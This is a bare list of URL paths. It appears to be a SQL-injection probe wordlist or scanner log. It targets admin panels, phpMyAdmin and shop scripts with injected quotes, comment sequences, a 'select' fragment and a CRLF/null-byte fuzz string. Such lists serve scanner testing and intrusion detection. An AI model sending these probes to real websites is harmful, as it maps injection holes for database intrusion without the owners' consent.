 /manager/admin/admin.php?sid=0'
-
 /cgi-binmessagedetail.asp?msg_id='
-
 /examples/jsp/num/shopaddtocart.asp?productid='42
-
 /cgi-bin/phpnews/sendtofriend.php?mid='1'
-
 /examples/jsp/jsp2/jspx/detail.asp?nchannel='1
-
 /phpmyadmin/documentation.html?bad_bad_value'=1
-
 /manager/index.php?act=arcade&do=stats&gameid=1'
-
 /examples/jsp/error/topic.php?tid='select
-
 /examples/jsp/checkbox/showproduct.php?product=1'
-
 /cgi-bin/shopaddtocart.asp?productid='42
-
 /examples/jsp/colors/cal_week.php?op=week&catview=999'
-
 /examples/jsp/colors/index.php?cat='
-
 /examples/jsp/cal/shopexd.asp?catalogid='42
-
 /main.php?logout=1 '" -- 
-
 /phpmyadmin/documentation.html?phpmyadmin='"'");|]*{%0d%0a<%00>
-
 /phpmyadmin/documentation.html?phpmyadmin=1"
-
